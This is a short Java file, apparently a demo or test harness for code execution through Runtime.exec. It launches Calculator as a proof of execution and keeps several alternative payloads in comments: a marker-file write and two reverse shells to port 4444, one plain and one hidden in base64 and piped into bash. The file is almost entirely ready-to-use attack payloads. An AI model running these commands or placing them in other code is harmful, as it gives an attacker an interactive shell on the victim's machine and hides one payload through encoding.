import java.io.IOException;

public class RuntimeDemo {

    public static void main(String[] args) {
        try {
//            Runtime.getRuntime().exec("touch /tmp/pwned");
            Runtime.getRuntime().exec("open -a Calculator");
//            Runtime.getRuntime().exec("/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMzYvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}");

//            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "echo abcdefgAAA12567 > /tmp/succccccccc111.txt"});
//            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.166.233/4444 0>&1"});
        } catch (Exception e) {
            System.out.println("Runtime#exec error!!!");
            e.printStackTrace();
        }
    }
}
